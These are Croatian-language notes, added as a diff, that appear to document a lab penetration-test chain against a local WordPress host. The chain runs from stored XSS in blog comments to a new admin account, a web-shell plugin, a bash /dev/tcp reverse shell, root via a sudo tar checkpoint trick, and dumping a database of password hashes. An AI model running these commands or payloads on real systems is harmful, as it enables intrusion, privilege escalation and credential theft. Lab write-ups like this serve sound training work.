@@ -1,0 +1,34 @@
+1. XSS na WP stranici (host1), polje za unos komentara na /blog je ranjivo na stored xss.
+
+2. Kreiranje novog administratora putem XSS (labadmin)
+
+3. Login na admin račun, upload custom plugina preko (helloshell.zip) plugin podstranice i aktivacija
+
+4.  http://localhost/wp-content/plugins/helloshell/helloshell.php?cmd=sudo -l 
+-  vidimo da www-data user ima pristup /usr/bin/tar (u sklopu automatiziranog backup-a)
+
+5. GTFObins tar trick do root ovlasti
+
+ali prije toga reverse shell za interaktivni shell
+
+5.1 lokalno nc -lvnp 4444
++ http://localhost/wp-content/plugins/helloshell/helloshell.php?cmd=echo+'bash+-i+>%26+/dev/tcp/172.17.0.1/4444+0>%261'+>+/tmp/rev.sh
+
++ http://localhost/wp-content/plugins/helloshell/helloshell.php?cmd=bash+/tmp/rev.sh
+
+script -q /dev/null -c bash
+5.2 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+6. Kao root na host1 pronalazimo još jednu bazu podataka sa hashiranim lozinkama (postmaster dostupan)
+(može se dodati i host u tablicu)
+mysql -uroot 
+SHOW DATABASES;
+USE appdb;
+SHOW TABLES;
+SELECT * FROM services;
+
+7. login & čitanje mailova
+
+
+
+
